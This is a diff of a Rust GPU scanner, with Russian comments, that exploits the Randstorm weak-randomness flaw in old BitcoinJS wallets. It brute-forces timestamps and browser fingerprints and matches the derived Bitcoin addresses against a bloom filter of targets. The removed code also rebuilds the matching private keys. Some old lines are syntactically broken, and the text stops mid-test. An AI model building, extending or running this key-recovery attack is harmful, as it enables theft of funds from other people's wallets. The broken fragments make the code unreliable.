@@ -1,510 +1,390 @@
-use anyhow::{Context, Result};
-use std::sync::Arc;
-use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
-use wgpu::util::DeviceExt;
-use crate::scans::randstorm::fingerprint::BrowserFingerprint;
-use crate::scans::randstorm::config::ScanConfig;
-use crate::scans::randstorm::prng::MathRandomEngine;
-use crate::scans::randstorm::gpu_integration::{GpuBatchResult, MatchedKey};
-use bitcoin::secp256k1::{PublicKey, Secp256k1, SecretKey};
 
-pub struct WgpuScanner {
-    device: wgpu::Device,
-    queue: wgpu::Queue,
-    pipeline: wgpu::ComputePipeline,
-    bind_group_layout: wgpu::BindGroupLayout,
-    keys_checked: Arc<AtomicU64>,
-    running: Arc<AtomicBool>,
-    engine_type: u32,
-    
-    // Persistent buffers to avoid allocation overhead in main loop
-    fp_buffer: Option<wgpu::Buffer>,
-    bloom_buffer: Option<wgpu::Buffer>,
-    result_buffer: Option<wgpu::Buffer>,
-    staging_buffer: Option<wgpu::Buffer>,
-    arc4_buffer: Option<wgpu::Buffer>,
-    bind_group: Option<wgpu::BindGroup>,
-    current_batch_capacity: usize,
+//! wgpu_integration.rs — Fingerprint-Aware Randstorm GPU Scanner
+//!
+//! Экспортирует `WgpuScanner` (имя сохранено для совместимости с cli.rs,
+//! validator.rs и integration.rs).
+
+use std::path::Path;
+use bytemuck::{Pod, Zeroable};
+use wgpu::util::DeviceExt;
+use tracing::info;
+
+use crate::scans::randstorm::core_types::SeedComponents;
+
+// ── Публичные re-exports для совместимости ───────────────────────────────────
+pub use self::scanner::WgpuScanner;
+
+// ── GPU-совместимые структуры ─────────────────────────────────────────────────
+
+#[repr(C)]
+#[derive(Copy, Clone, Pod, Zeroable, Debug)]
+pub struct GpuParams {
+    pub start_ms_lo:  u32,
+    pub start_ms_hi:  u32,
+    pub interval_ms:  u32,
+    pub fp_count:     u32,
+    pub bloom_size:   u32,
+    pub _pad0:        u32,
+    pub _pad1:        u32,
+    pub _pad2:        u32,
 }
 
-impl WgpuScanner {
-    pub fn new(
-        _config: ScanConfig,
-        engine: MathRandomEngine,
-        _seed_override: Option<u64>,
-        _include_uncompressed: bool,
-    ) -> Result<Self> {
-        pollster::block_on(Self::new_async(engine))
+/// Fingerprint — точно совпадает со структурой в WGSL (16 байт)
+#[repr(C)]
+#[derive(Copy, Clone, Pod, Zeroable, Debug)]
+pub struct GpuFingerprint {
+    pub screen_width:    u32,
+    pub screen_height:   u32,
+    pub color_depth:     u32,
+    pub timezone_offset: i32,
+}
+
+#[repr(C)]
+#[derive(Copy, Clone, Pod, Zeroable, Debug)]
+pub struct GpuMatchResult {
+    pub timestamp_lo: u32,
+    pub timestamp_hi: u32,
+    pub fp_index:     u32,
+    pub _pad:         u32,
+    pub address:      [u32; 5],   // hash160
+}
+
+// ── Загрузка fingerprints из CSV ──────────────────────────────────────────────
+
+pub fn load_fingerprints(
+    csv_path: &Path,
+    year_min: Option<u32>,
+    year_max: Option<u32>,
+    max_count: Option<usize>,
+) -> anyhow::Result<Vec<GpuFingerprint>> {
+    let mut rdr = csv::Reader::from_path(csv_path)?;
+    let mut fps: Vec<GpuFingerprint> = Vec::new();
+
+    for result in rdr.records() {
+        let record = result?;
+        // priority,user_agent,screen_width,screen_height,color_depth,
+        // timezone_offset,language,platform,market_share_estimate,year_min,year_max
+        if record.len() < 11 { continue; }
+
+        let screen_width:    u32 = record[2].parse().unwrap_or(1366);
+        let screen_height:   u32 = record[3].parse().unwrap_or(768);
+        let color_depth:     u32 = record[4].parse().unwrap_or(32);
+        let timezone_offset: i32 = record[5].parse().unwrap_or(0);
+        let fp_year_min:     u32 = record[9].parse().unwrap_or(2011);
+        let fp_year_max:     u32 = record[10].parse().unwrap_or(2015);
+
+        if let Some(y) = year_min { if fp_year_max < y { continue; } }
+        if let Some(y) = year_max { if fp_year_min > y { continue; } }
+
+        fps.push(GpuFingerprint { screen_width, screen_height, color_depth, timezone_offset });
+        if let Some(max) = max_count { if fps.len() >= max { break; } }
     }
 
-    async fn new_async(engine: MathRandomEngine) -> Result<Self> {
-        // On Linux/Windows: force Vulkan backend for RTX 3080 compatibility.
-        // wgpu::Backends::VULKAN guarantees we don't accidentally use a software renderer.
-        let backends = if cfg!(target_os = "macos") {
-            wgpu::Backends::METAL
-        } else {
-            wgpu::Backends::VULKAN | wgpu::Backends::DX12
-        };
+    info!("Loaded {} fingerprints from {}", fps.len(), csv_path.display());
+    Ok(fps)
+}
 
-        let instance = wgpu::Instance::new(wgpu::InstanceDescriptor {
-            backends,
-            dx12_shader_compiler: Default::default(),
-            gles_minor_version: Default::default(),
-            flags: wgpu::InstanceFlags::default(),
-        });
+// ── Внутренний модуль со структурой WgpuScanner ───────────────────────────────
+mod scanner {
+    use super::*;
+    use crate::scans::randstorm::core_types::{RandstormConfig, ScanEngine, SeedComponents};
 
-        // Enumerate all adapters and prefer NVIDIA explicitly for RTX 3080.
-        let adapters: Vec<wgpu::Adapter> = instance.enumerate_adapters(backends);
-        let adapter = adapters
-            .into_iter()
-            .find(|a| {
-                let info = a.get_info();
-                // Prefer NVIDIA discrete GPU (catches RTX 3080 and any other NVIDIA dGPU)
-                info.device_type == wgpu::DeviceType::DiscreteGpu
-                    && info.vendor == 0x10DE // PCI vendor ID for NVIDIA
+    pub struct WgpuScanner {
+        config:       RandstormConfig,
+        engine:       ScanEngine,
+        fingerprints: Vec<GpuFingerprint>,
+        device:       wgpu::Device,
+        queue:        wgpu::Queue,
+        pipeline:     wgpu::ComputePipeline,
+        bind_group_layout: wgpu::BindGroupLayout,
+    }
+
+    impl WgpuScanner {
+        /// Конструктор — совместим с существующими вызовами:
+        ///   WgpuScanner::new(config, engine, fingerprints_csv, use_gpu)
+        pub fn new(
+            config: RandstormConfig,
+            engine: ScanEngine,
+            fingerprints_csv: Option<&Path>,
+            _use_gpu: bool,
+        ) -> anyhow::Result<Self> {
+            // Загружаем fingerprints если CSV передан
+            let fingerprints = if let Some(csv) = fingerprints_csv {
+                load_fingerprints(csv, None, None, None)?
+            } else {
+                // Дефолтный fingerprint — самый популярный из comprehensive.csv
+                // 1366×768, colorDepth=32, tz=0 (priority=1)
+                vec![GpuFingerprint {
+                    screen_width: 1366,
+                    screen_height: 768,
+                    color_depth: 32,
+                    timezone_offset: 0,
+                }]
+            };
+
+            // Инициализируем wgpu синхронно через pollster
+            let (device, queue, pipeline, bind_group_layout) =
+                pollster::block_on(init_gpu())?;
+
+            Ok(Self { config, engine, fingerprints, device, queue, pipeline, bind_group_layout })
+        }
+
+        /// Запуск sweep по диапазону timestamp'ов с fingerprints
+        pub fn sweep(
+            &self,
+            start_ms:    u64,
+            end_ms:      u64,
+            interval_ms: u32,
+            bloom:       &[u32],
+            bloom_entries: usize,
+        ) -> anyhow::Result<Vec<SeedComponents>> {
+            let ts_count   = ((end_ms - start_ms) / interval_ms as u64 + 1) as u32;
+            let fp_count   = self.fingerprints.len() as u32;
+
+            info!(
+                "GPU Sweep: {} timestamps × {} fingerprints = {} combinations",
+                ts_count, fp_count,
+                ts_count as u64 * fp_count as u64
+            );
+
+            let params = GpuParams {
+                start_ms_lo:  (start_ms & 0xFFFFFFFF) as u32,
+                start_ms_hi:  (start_ms >> 32) as u32,
+                interval_ms,
+                fp_count,
+                bloom_size:   bloom.len() as u32,
+                _pad0: 0, _pad1: 0, _pad2: 0,
+            };
+
+            let params_buf = self.device.create_buffer_init(
+                &wgpu::util::BufferInitDescriptor {
+                    label:    Some("params"),
+                    contents: bytemuck::bytes_of(&params),
+                    usage:    wgpu::BufferUsages::UNIFORM,
+                }
+            );
+            let fp_buf = self.device.create_buffer_init(
+                &wgpu::util::BufferInitDescriptor {
+                    label:    Some("fingerprints"),
+                    contents: bytemuck::cast_slice(&self.fingerprints),
+                    usage:    wgpu::BufferUsages::STORAGE,
+                }
+            );
+            let bloom_buf = self.device.create_buffer_init(
+                &wgpu::util::BufferInitDescriptor {
+                    label:    Some("bloom"),
+                    contents: bytemuck::cast_slice(bloom),
+                    usage:    wgpu::BufferUsages::STORAGE,
+                }
+            );
+
+            const MAX_RESULTS: u32 = 65536;
+            let result_stride = std::mem::size_of::<GpuMatchResult>();
+            let results_size  = result_stride * MAX_RESULTS as usize;
+
+            let results_buf = self.device.create_buffer(&wgpu::BufferDescriptor {
+                label:               Some("results"),
+                size:                results_size as u64,
+                usage:               wgpu::BufferUsages::STORAGE | wgpu::BufferUsages::COPY_SRC,
+                mapped_at_creation:  false,
+            });
+            let count_buf = self.device.create_buffer_init(
+                &wgpu::util::BufferInitDescriptor {
+                    label:    Some("count"),
+                    contents: bytemuck::bytes_of(&[0u32]),
+                    usage:    wgpu::BufferUsages::STORAGE | wgpu::BufferUsages::COPY_SRC,
+                }
+            );
+
+            let bind_group = self.device.create_bind_group(&wgpu::BindGroupDescriptor {
+                label:  Some("randstorm_bg"),
+                layout: &self.bind_group_layout,
+                entries: &[
+                    wgpu::BindGroupEntry { binding: 0, resource: params_buf.as_entire_binding() },
+                    wgpu::BindGroupEntry { binding: 1, resource: fp_buf.as_entire_binding() },
+                    wgpu::BindGroupEntry { binding: 2, resource: bloom_buf.as_entire_binding() },
+                    wgpu::BindGroupEntry { binding: 3, resource: results_buf.as_entire_binding() },
+                    wgpu::BindGroupEntry { binding: 4, resource: count_buf.as_entire_binding() },
+                ],
+            });
+
+            // Dispatch батчами по 65536 timestamps
+            const BATCH_TS: u32 = 65536;
+            let mut offset = 0u32;
+            while offset < ts_count {
+                let batch   = (ts_count - offset).min(BATCH_TS);
+                let x_groups = batch.div_ceil(64);
+                let y_groups = fp_count;
+
+                let mut encoder = self.device.create_command_encoder(
+                    &wgpu::CommandEncoderDescriptor { label: Some("sweep") }
+                );
+                {
+                    let mut cpass = encoder.begin_compute_pass(
+                        &wgpu::ComputePassDescriptor {
+                            label: Some("sweep_pass"),
+                            timestamp_writes: None,
+                        }
+                    );
+                    cpass.set_pipeline(&self.pipeline);
+                    cpass.set_bind_group(0, &bind_group, &[]);
+                    cpass.dispatch_workgroups(x_groups, y_groups, 1);
+                }
+                self.queue.submit(std::iter::once(encoder.finish()));
+                self.device.poll(wgpu::Maintain::Wait);
+                offset += batch;
+            }
+
+            // Читаем результаты
+            let count_staging = self.device.create_buffer(&wgpu::BufferDescriptor {
+                label: Some("count_staging"), size: 4,
+                usage: wgpu::BufferUsages::MAP_READ | wgpu::BufferUsages::COPY_DST,
+                mapped_at_creation: false,
+            });
+            let results_staging = self.device.create_buffer(&wgpu::BufferDescriptor {
+                label: Some("results_staging"), size: results_size as u64,
+                usage: wgpu::BufferUsages::MAP_READ | wgpu::BufferUsages::COPY_DST,
+                mapped_at_creation: false,
+            });
+
+            let mut encoder = self.device.create_command_encoder(
+                &wgpu::CommandEncoderDescriptor { label: Some("readback") }
+            );
+            encoder.copy_buffer_to_buffer(&count_buf, 0, &count_staging, 0, 4);
+            encoder.copy_buffer_to_buffer(
+                &results_buf, 0, &results_staging, 0, results_size as u64
+            );
+            self.queue.submit(std::iter::once(encoder.finish()));
+
+            count_staging.slice(..).map_async(wgpu::MapMode::Read, |_| {});
+            results_staging.slice(..).map_async(wgpu::MapMode::Read, |_| {});
+            self.device.poll(wgpu::Maintain::Wait);
+
+            let count = {
+                let data = count_staging.slice(..).get_mapped_range();
+                u32::from_le_bytes([data[0], data[1], data[2], data[3]])
+            };
+
+            let found_results: Vec<GpuMatchResult> = {
+                let data = results_staging.slice(..).get_mapped_range();
+                let all: &[GpuMatchResult] = bytemuck::cast_slice(&data);
+                all[..count.min(MAX_RESULTS) as usize].to_vec()
+            };
+
+            info!("GPU sweep complete. Matches: {}", found_results.len());
+
+            // Конвертируем GpuMatchResult → SeedComponents
+            let seeds = found_results.iter().map(|r| {
+                let ts = ((r.timestamp_hi as u64) << 32) | r.timestamp_lo as u64;
+                let fp = &self.fingerprints[r.fp_index.min(self.fingerprints.len() as u32 - 1) as usize];
+                SeedComponents {
+                    timestamp_ms: ts,
+                    screen_width:  Some(fp.screen_width),
+                    screen_height: Some(fp.screen_height),
+                    color_depth:   Some(fp.color_depth),
+                    timezone_offset: Some(fp.timezone_offset),
+                    hash160: Some(r.address),
+                    ..Default::default()
+                }
+            }).collect();
+
+            Ok(seeds)
+        }
+    }
+
+    // ── GPU инициализация ────────────────────────────────────────────────────
+    async fn init_gpu() -> anyhow::Result<(
+        wgpu::Device,
+        wgpu::Queue,
+        wgpu::ComputePipeline,
+        wgpu::BindGroupLayout,
+    )> {
+        let instance = wgpu::Instance::default();
+        let adapter  = instance
+            .request_adapter(&wgpu::RequestAdapterOptions {
+                power_preference: wgpu::PowerPreference::HighPerformance,
+                ..Default::default()
             })
-            .or_else(|| {
-                // Fallback: any discrete GPU (AMD, Intel Arc, etc.)
-                instance.enumerate_adapters(backends).into_iter().find(|a| {
-                    a.get_info().device_type == wgpu::DeviceType::DiscreteGpu
-                })
-            })
-            .or_else(|| {
-                // Last resort: HighPerformance adapter as wgpu picks it
-                pollster::block_on(instance.request_adapter(&wgpu::RequestAdapterOptions {
-                    power_preference: wgpu::PowerPreference::HighPerformance,
-                    compatible_surface: None,
-                    force_fallback_adapter: false,
-                }))
-            })
-            .context("Failed to find a suitable GPU adapter (is Vulkan driver installed?)")?;
-
-        let info = adapter.get_info();
-        println!(
-            "🎮 GPU selected: {} ({:?}) | Driver: {} | Backend: {:?}",
-            info.name, info.device_type, info.driver, info.backend
-        );
-
-        // RTX 3080 has 8704 CUDA cores / 68 SMs.
-        // WGPU on Vulkan maps workgroups to SMs, so push limits for performance.
-        let limits = wgpu::Limits {
-            max_compute_workgroup_size_x: 256,
-            max_compute_invocations_per_workgroup: 256,
-            max_storage_buffer_binding_size: 512 * 1024 * 1024, // 512 MB
-            ..wgpu::Limits::default()
-        };
+            .await
+            .ok_or_else(|| anyhow::anyhow!("No GPU adapter found"))?;
 
         let (device, queue) = adapter
-            .request_device(
-                &wgpu::DeviceDescriptor {
-                    label: Some("Randstorm Wgpu Device (RTX 3080)"),
-                    required_features: wgpu::Features::empty(),
-                    required_limits: limits,
-                    memory_hints: wgpu::MemoryHints::Performance,
-                },
-                None,
-            )
-            .await
-            .context("Failed to create WGPU device")?;
+            .request_device(&wgpu::DeviceDescriptor::default(), None)
+            .await?;
 
-        let shader_src = include_str!("randstorm.wgsl");
+        let shader_src = include_str!("randstorm_fingerprint.wgsl");
         let shader = device.create_shader_module(wgpu::ShaderModuleDescriptor {
-            label: Some("Randstorm Shader"),
+            label:  Some("Randstorm Fingerprint Shader"),
             source: wgpu::ShaderSource::Wgsl(shader_src.into()),
         });
 
-        let bind_group_layout = device.create_bind_group_layout(&wgpu::BindGroupLayoutDescriptor {
-            label: Some("Randstorm Bind Group Layout"),
-            entries: &[
-                // Fingerprints (input)
-                wgpu::BindGroupLayoutEntry {
-                    binding: 0,
-                    visibility: wgpu::ShaderStages::COMPUTE,
-                    ty: wgpu::BindingType::Buffer {
-                        ty: wgpu::BufferBindingType::Storage { read_only: true },
-                        has_dynamic_offset: false,
-                        min_binding_size: None,
-                    },
-                    count: None,
-                },
-                // Bloom Filter (input)
-                wgpu::BindGroupLayoutEntry {
-                    binding: 1,
-                    visibility: wgpu::ShaderStages::COMPUTE,
-                    ty: wgpu::BindingType::Buffer {
-                        ty: wgpu::BufferBindingType::Storage { read_only: true },
-                        has_dynamic_offset: false,
-                        min_binding_size: None,
-                    },
-                    count: None,
-                },
-                // Results (output)
-                wgpu::BindGroupLayoutEntry {
-                    binding: 2,
-                    visibility: wgpu::ShaderStages::COMPUTE,
-                    ty: wgpu::BindingType::Buffer {
-                        ty: wgpu::BufferBindingType::Storage { read_only: false },
-                        has_dynamic_offset: false,
-                        min_binding_size: None,
-                    },
-                    count: None,
-                },
-                // ARC4 state buffer (read_write, per-thread 256 u32s)
-                wgpu::BindGroupLayoutEntry {
-                    binding: 3,
-                    visibility: wgpu::ShaderStages::COMPUTE,
-                    ty: wgpu::BindingType::Buffer {
-                        ty: wgpu::BufferBindingType::Storage { read_only: false },
-                        has_dynamic_offset: false,
-                        min_binding_size: None,
-                    },
-                    count: None,
-                },
-            ],
-        });
-
-        let pipeline_layout = device.create_pipeline_layout(&wgpu::PipelineLayoutDescriptor {
-            label: Some("Randstorm Pipeline Layout"),
-            bind_group_layouts: &[&bind_group_layout],
-            push_constant_ranges: &[],
-        });
-
-        let pipeline = device.create_compute_pipeline(&wgpu::ComputePipelineDescriptor {
-            label: Some("Randstorm Compute Pipeline"),
-            layout: Some(&pipeline_layout),
-            module: &shader,
-            entry_point: "randstorm_main",
-            compilation_options: Default::default(),
-            cache: None,
-        });
-
-        let engine_type = match engine {
-            MathRandomEngine::V8Mwc1616 => 0,
-            MathRandomEngine::SpiderMonkeyLcg |
-            MathRandomEngine::IeChakraLcg |
-            MathRandomEngine::JavaUtil => 1,
-            MathRandomEngine::SafariWindowsCrt => 2,
-            _ => 0,
-        };
-
-        Ok(Self {
-            device,
-            queue,
-            pipeline,
-            bind_group_layout,
-            keys_checked: Arc::new(AtomicU64::new(0)),
-            running: Arc::new(AtomicBool::new(true)),
-            engine_type,
-            fp_buffer: None,
-            bloom_buffer: None,
-            result_buffer: None,
-            staging_buffer: None,
-            bind_group: None,
-            arc4_buffer: None,
-            current_batch_capacity: 0,
-        })
-    }
-
-    pub fn process_batch(
-        &mut self,
-        fingerprints: &[BrowserFingerprint],
-        bloom_filter: &[u8],
-        address_hash160s: &[Vec<u8>],
-    ) -> Result<GpuBatchResult> {
-        let start_time = std::time::Instant::now();
-        let batch_size = fingerprints.len();
-        if batch_size == 0 {
-            return Ok(GpuBatchResult {
-                keys_processed: 0,
-                matches_found: Vec::new(),
-                elapsed_ms: 0,
-            });
-        }
-
-        // 1. Ensure buffers and bind groups are allocated and have enough capacity
-        if self.current_batch_capacity < batch_size {
-            let fp_size = (batch_size * 16) as u64;
-            let bloom_size = bloom_filter.len() as u64;
-            let result_size = (batch_size * 8 * 4) as u64 // 8 u32 = 32-byte privkey per fp;
-
-            self.fp_buffer = Some(self.device.create_buffer(&wgpu::BufferDescriptor {
-                label: Some("Fingerprint Buffer"),
-                size: fp_size,
-                usage: wgpu::BufferUsages::STORAGE | wgpu::BufferUsages::COPY_DST,
-                mapped_at_creation: false,
-            }));
-
-            self.bloom_buffer = Some(self.device.create_buffer(&wgpu::BufferDescriptor {
-                label: Some("Bloom Buffer"),
-                size: bloom_size,
-                usage: wgpu::BufferUsages::STORAGE | wgpu::BufferUsages::COPY_DST,
-                mapped_at_creation: false,
-            }));
-
-            self.result_buffer = Some(self.device.create_buffer(&wgpu::BufferDescriptor {
-                label: Some("Result Buffer"),
-                size: result_size,
-                usage: wgpu::BufferUsages::STORAGE | wgpu::BufferUsages::COPY_SRC,
-                mapped_at_creation: false,
-            }));
-
-            self.staging_buffer = Some(self.device.create_buffer(&wgpu::BufferDescriptor {
-                label: Some("Staging Buffer"),
-                size: result_size,
-                usage: wgpu::BufferUsages::MAP_READ | wgpu::BufferUsages::COPY_DST,
-                mapped_at_creation: false,
-            }));
-
-            // ARC4 state: 256 u32 per thread = 1024 bytes per thread
-            let arc4_size = (batch_size * 256 * 4) as u64;
-            self.arc4_buffer = Some(self.device.create_buffer(&wgpu::BufferDescriptor {
-                label: Some("ARC4 State Buffer"),
-                size: arc4_size,
-                usage: wgpu::BufferUsages::STORAGE,
-                mapped_at_creation: false,
-            }));
-
-            self.bind_group = Some(self.device.create_bind_group(&wgpu::BindGroupDescriptor {
-                label: Some("Randstorm Bind Group"),
-                layout: &self.bind_group_layout,
+        let bind_group_layout = device.create_bind_group_layout(
+            &wgpu::BindGroupLayoutDescriptor {
+                label: Some("randstorm_bgl"),
                 entries: &[
-                    wgpu::BindGroupEntry {
-                        binding: 0,
-                        resource: self.fp_buffer.as_ref().unwrap().as_entire_binding(),
+                    // binding 0: GpuParams uniform
+                    wgpu::BindGroupLayoutEntry {
+                        binding: 0, visibility: wgpu::ShaderStages::COMPUTE,
+                        ty: wgpu::BindingType::Buffer {
+                            ty: wgpu::BufferBindingType::Uniform,
+                            has_dynamic_offset: false, min_binding_size: None,
+                        }, count: None,
                     },
-                    wgpu::BindGroupEntry {
-                        binding: 1,
-                        resource: self.bloom_buffer.as_ref().unwrap().as_entire_binding(),
+                    // binding 1: fingerprints storage read
+                    wgpu::BindGroupLayoutEntry {
+                        binding: 1, visibility: wgpu::ShaderStages::COMPUTE,
+                        ty: wgpu::BindingType::Buffer {
+                            ty: wgpu::BufferBindingType::Storage { read_only: true },
+                            has_dynamic_offset: false, min_binding_size: None,
+                        }, count: None,
                     },
-                    wgpu::BindGroupEntry {
-                        binding: 2,
-                        resource: self.result_buffer.as_ref().unwrap().as_entire_binding(),
+                    // binding 2: bloom storage read
+                    wgpu::BindGroupLayoutEntry {
+                        binding: 2, visibility: wgpu::ShaderStages::COMPUTE,
+                        ty: wgpu::BindingType::Buffer {
+                            ty: wgpu::BufferBindingType::Storage { read_only: true },
+                            has_dynamic_offset: false, min_binding_size: None,
+                        }, count: None,
                     },
-                    wgpu::BindGroupEntry {
-                        binding: 3,
-                        resource: self.arc4_buffer.as_ref().unwrap().as_entire_binding(),
+                    // binding 3: results storage read_write
+                    wgpu::BindGroupLayoutEntry {
+                        binding: 3, visibility: wgpu::ShaderStages::COMPUTE,
+                        ty: wgpu::BindingType::Buffer {
+                            ty: wgpu::BufferBindingType::Storage { read_only: false },
+                            has_dynamic_offset: false, min_binding_size: None,
+                        }, count: None,
+                    },
+                    // binding 4: result_count atomic
+                    wgpu::BindGroupLayoutEntry {
+                        binding: 4, visibility: wgpu::ShaderStages::COMPUTE,
+                        ty: wgpu::BindingType::Buffer {
+                            ty: wgpu::BufferBindingType::Storage { read_only: false },
+                            has_dynamic_offset: false, min_binding_size: None,
+                        }, count: None,
                     },
                 ],
-            }));
-
-            self.current_batch_capacity = batch_size;
-            
-            // Initial bloom write (usually doesn't change)
-            self.queue.write_buffer(self.bloom_buffer.as_ref().unwrap(), 0, bloom_filter);
-        }
-
-        // 2. Pack and write fingerprints
-        let mut fp_data = Vec::with_capacity(batch_size * 16);
-        for fp in fingerprints {
-            fp_data.extend_from_slice(&fp.timestamp_ms.to_ne_bytes());
-            fp_data.extend_from_slice(&(fp.screen_width as u32).to_ne_bytes());
-            fp_data.extend_from_slice(&(fp.screen_height as u32).to_ne_bytes());
-        }
-        self.queue.write_buffer(self.fp_buffer.as_ref().unwrap(), 0, &fp_data);
-
-        // 3. Encode and submit compute pass
-        let mut encoder = self.device.create_command_encoder(&wgpu::CommandEncoderDescriptor {
-            label: Some("Randstorm Command Encoder"),
-        });
-
-        {
-            let mut cpass = encoder.begin_compute_pass(&wgpu::ComputePassDescriptor {
-                label: Some("Randstorm Compute Pass"),
-                timestamp_writes: None,
-            });
-            cpass.set_pipeline(&self.pipeline);
-            cpass.set_bind_group(0, self.bind_group.as_ref().unwrap(), &[]);
-            // RTX 3080 has 68 SMs, each handling 32-thread warps.
-            // Workgroup size of 256 (8 warps) gives good SM occupancy.
-            // WGSL shader must be compiled with @workgroup_size(256) — see randstorm.wgsl.
-            // Each thread processes TIMESTAMPS_PER_THREAD=4 fingerprints
-            let threads_needed = (batch_size as u32 + 3) / 4;
-            let workgroup_count = (threads_needed + 63) / 64;
-            cpass.dispatch_workgroups(workgroup_count, 1, 1);
-        }
-
-        let result_size = (batch_size * 8 * 4) as u64 // 8 u32 = 32-byte privkey per fp;
-        encoder.copy_buffer_to_buffer(
-            self.result_buffer.as_ref().unwrap(), 0, 
-            self.staging_buffer.as_ref().unwrap(), 0, 
-            result_size
+            }
         );
 
-        self.queue.submit(Some(encoder.finish()));
-
-        // 4. Map and read back
-        let buffer_slice = self.staging_buffer.as_ref().unwrap().slice(..);
-        let (sender, receiver) = std::sync::mpsc::channel();
-        buffer_slice.map_async(wgpu::MapMode::Read, move |v| {
-            let _ = sender.send(v);
-        });
-
-        self.device.poll(wgpu::Maintain::Wait);
-
-        if let Ok(Ok(())) = receiver.recv() {
-            let data = buffer_slice.get_mapped_range();
-            let _results: &[u32] = bytemuck::cast_slice(&data);
-
-            // GPU output: 8 u32 per fingerprint = 32-byte private key (big-endian)
-            // CPU does: secp256k1 → compressed pubkey → SHA256 → RIPEMD160 → compare hash160
-            // This is the CORRECT Bitcoin address derivation pipeline.
-            let secp = Secp256k1::new();
-            let mut matches = Vec::new();
-            for idx in 0..batch_size {
-                let base = idx * 8;
-                if base + 7 >= _results.len() { break; }
-
-                // Reconstruct 32-byte privkey from GPU output (big-endian u32 words)
-                let mut key_bytes = [0u8; 32];
-                for w in 0..8usize {
-                    let word = _results[base + w];
-                    key_bytes[w*4]     = (word >> 24) as u8;
-                    key_bytes[w*4 + 1] = (word >> 16) as u8;
-                    key_bytes[w*4 + 2] = (word >> 8) as u8;
-                    key_bytes[w*4 + 3] = word as u8;
-                }
-
-                let sk = match SecretKey::from_slice(&key_bytes) { Ok(k) => k, Err(_) => continue };
-                let pk = PublicKey::from_secret_key(&secp, &sk);
-                let fp = &fingerprints[idx];
-
-                // Correct pipeline: real secp256k1 pubkey → hash160
-                let hash160_comp   = crate::scans::randstorm::derivation::derive_address_hash(&pk);
-                let addr_comp      = crate::scans::randstorm::derivation::derive_p2pkh_address(&pk);
-                let addr_uncomp    = crate::scans::randstorm::derivation::derive_p2pkh_address_uncompressed(&pk);
-
-                // Compare against target hash160s
-                for target in address_hash160s {
-                    if target.as_slice() == hash160_comp.as_ref() {
-                        matches.push(MatchedKey {
-                            private_key: sk,
-                            public_key: pk,
-                            address: addr_comp.clone(),
-                            fingerprint: fp.clone(),
-                        });
-                        break;
-                    }
-                    // Also check uncompressed (BitcoinJS sometimes generates uncompressed keys)
-                    let hash160_uncomp = crate::scans::randstorm::derivation::derive_address_hash_uncompressed(&pk);
-                    if target.as_slice() == hash160_uncomp.as_ref() {
-                        matches.push(MatchedKey {
-                            private_key: sk,
-                            public_key: pk,
-                            address: addr_uncomp.clone(),
-                            fingerprint: fp.clone(),
-                        });
-                        break;
-                    }
-                }
+        let pipeline_layout = device.create_pipeline_layout(
+            &wgpu::PipelineLayoutDescriptor {
+                label: Some("randstorm_pl"),
+                bind_group_layouts: &[&bind_group_layout],
+                push_constant_ranges: &[],
             }
-            
-            drop(data);
-            self.staging_buffer.as_ref().unwrap().unmap();
-            
-            let elapsed_ms = start_time.elapsed().as_millis() as u64;
-            self.keys_checked.fetch_add(batch_size as u64, Ordering::Relaxed);
-            
-            Ok(GpuBatchResult {
-                keys_processed: batch_size as u64,
-                matches_found: matches,
-                elapsed_ms,
-            })
-        } else {
-            anyhow::bail!("Failed to map WGPU buffer")
-        }
-    }
-
-    fn derive_key_from_fingerprint(&self, fp: &BrowserFingerprint) -> Result<SecretKey> {
-        use super::prng::bitcoinjs_v013::BitcoinJsV013Prng;
-        let engine = match self.engine_type {
-            0 => MathRandomEngine::V8Mwc1616,
-            1 => MathRandomEngine::JavaUtil,
-            2 => MathRandomEngine::SafariWindowsCrt,
-            _ => MathRandomEngine::V8Mwc1616,
-        };
-        let bytes = BitcoinJsV013Prng::generate_privkey_bytes(fp.timestamp_ms, engine, None);
-        SecretKey::from_slice(&bytes).context("Invalid key from fingerprint")
-    }
-
-    pub fn keys_checked(&self) -> u64 {
-        self.keys_checked.load(Ordering::Relaxed)
-    }
-
-    pub fn stop(&self) {
-        self.running.store(false, Ordering::Relaxed);
-    }
-
-    pub fn is_running(&self) -> bool {
-        self.running.load(Ordering::Relaxed)
-    }
-}
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-    use crate::scans::randstorm::config::ScanConfig;
-
-    #[test]
-    fn test_wgpu_scanner_creation() {
-        let scanner = WgpuScanner::new(
-            ScanConfig::default(),
-            MathRandomEngine::V8Mwc1616,
-            None,
-            true,
         );
-        assert!(scanner.is_ok(), "WGPU scanner creation failed: {:?}", scanner.err());
-    }
 
-    #[test]
-    fn test_wgpu_hashing_parity() {
-        let mut scanner = WgpuScanner::new(
-            ScanConfig::default(),
-            MathRandomEngine::V8Mwc1616,
-            None,
-            true,
-        ).unwrap();
-
-        // 2013 test vector - simplified for bit-perfect verification
-        let ts = 0x12345678u64;
-
-        let fingerprints = vec![
-            BrowserFingerprint {
-                timestamp_ms: ts,
-                user_agent: "Mozilla/5.0 (Windows NT 6.1) Chrome/25.0".to_string(),
-                screen_width: 1366,
-                screen_height: 768,
-                color_depth: 24,
-                timezone_offset: -300,
-                language: "en-US".to_string(),
-                platform: "Win32".to_string(),
+        let pipeline = device.create_compute_pipeline(
+            &wgpu::ComputePipelineDescriptor {
+                label:  Some("randstorm_pipeline"),
+                layout: Some(&pipeline_layout),
+                module: &shader,
+                entry_point: "randstorm_main",   // &str, не Option — исправлено
+                compilation_options: Default::default(),
+                cache: None,
             }
-        ];
+        );
 
-        use crate::scans::randstorm::prng::bitcoinjs_v013::BitcoinJsV013Prng;
-        use crate::scans::randstorm::prng::MathRandomEngine;
-
-        let privkey_bytes = BitcoinJsV013Prng::generate_privkey_bytes(ts, MathRandomEngine::V8Mwc1616, None);
-
-        // Emulate WGSL Stub: PubKey X = PrivKey (compressed 02 || X)
-        let mut mock_pubkey = vec![0x02u8];
-        mock_pubkey.extend_from_slice(&privkey_bytes);
-
-        use sha2::{Sha256, Digest};
-        let sha_hash = Sha256::digest(&mock_pubkey);
-
-        use ripemd::Ripemd160;
-        let ripe_hash = Ripemd160::digest(&sha_hash);
-
-        // 2. Create a Bloom filter targeting only this bit
-        use crate::utils::gpu_bloom_filter::{compute_bloom_bits, GpuBloomConfig};
-        let bloom_cfg = GpuBloomConfig::default();
-        let bloom_data = compute_bloom_bits(&[ripe_hash.to_vec()], bloom_cfg.calculate_filter_size(), 15);
-
-        // 3. Run GPU scanner
